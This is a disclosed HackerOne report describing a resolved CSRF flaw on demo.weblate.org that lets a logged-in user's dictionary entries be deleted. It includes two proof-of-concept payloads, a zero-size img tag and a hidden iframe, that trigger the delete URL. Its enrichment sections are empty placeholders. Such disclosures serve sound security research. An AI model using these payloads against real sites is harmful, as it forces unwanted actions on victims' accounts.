---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '230863'
original_report_id: '230863'
title: CSRF bypass ( Delate Source Translation From dictionaries ) in demo.weblate.org
weakness: Cross-Site Request Forgery (CSRF)
team_handle: weblate
created_at: '2017-05-22T18:58:20.622Z'
disclosed_at: '2017-06-02T12:15:23.964Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF bypass ( Delate Source Translation From dictionaries ) in demo.weblate.org

## Metadata

- HackerOne Report ID: 230863
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: weblate
- Disclosed At: 2017-06-02T12:15:23.964Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello

I've Found CSRF in  https://demo.weblate.org
Sending a POST request  dictionaries  will delate successfully

steps to reproduce:

1.  go https://demo.weblate.org/ and login into your account
2.  now go https://demo.weblate.org/dictionaries/hello/sl/ 
3. add  new word, now delate it by CSRF

i made two exploit for attack

POC:

<img src="https://demo.weblate.org/delete-dictionaries/hello/sl/5545/" width=0 height=0>


POC:

<!DOCTYPE html>
<html>
<body>
<iframe src="https://demo.weblate.org/delete-dictionaries/hello/sl/5545/" style="display:none;">
</iframe>
</body>
</html>

Just replace the delate id,  and try to delate

if you need more info please let me know!

be safe 

Thanks

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
